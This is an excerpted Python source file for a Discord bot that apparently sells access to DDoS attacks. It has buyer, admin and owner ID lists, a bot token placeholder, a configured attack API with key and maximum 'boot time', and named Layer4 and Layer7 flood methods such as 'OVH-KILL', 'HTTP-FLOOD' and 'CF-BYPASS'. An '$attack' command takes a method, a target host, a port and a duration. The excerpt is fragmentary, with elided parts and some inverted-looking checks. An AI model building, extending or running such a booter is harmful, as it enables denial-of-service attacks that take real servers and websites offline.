...
buyers  = [1]  # EDIT IT (Discord User ID) PAKE ''
admins  = [1]  # EDIT IT (Id AdminLu) PAKE ''
owners  = [1]  # EDIT IT (Id Owner) PAKE ''
token   = 'token bot' # EDIT IT (Bot Token)
bot     = commands.Bot(command_prefix='$')

l4methods = ['TCP-BYPASS', 'UDP-BYPASS', 'OVH-KILL', 'NFO-KILL']
l7methods = ['HTTP-RAPE', 'HTTP-FLOOD', 'CF-BYPASS']
__api = [
    {
        'api_url':'https://scynetapi.com/', # EDIT IT (Apis Lu)
        'api_key':'scynetapikey',      # EDIT IT (GApi Key Lu)
        'max_boot_time':'1800'                  # EDIT IT (Time Lu)
    }
]
...
async def attack(ctx, method : str = None, hostip : str = None, port : str = None, time : str = None):
    if ctx.author.id not in buyers:
        ...
        if method is None or method.upper() == 'HELP':
            ...
            embed.add_field(name="Layer4 Methods: \n"f"{l4methodstr}", value= " Layer4 Method For Attacking A Servers")
            embed.add_field(name="Layer7 Methods: \n"f"{l7methodstr}", value = " Layer7 Method For Attacking A Website")                  
            ...
            for i in __api:
                try:
                    api_url = i["api_url"] # API LU
                    api_key = i["api_key"] # API KEY
                    max_boot_time = int(i["max_boot_time"]) # MAX TIME
...
async def on_ready():
    ...
    print(f'Logged in on {bot.user.name}. Subscribe ScySG GT')
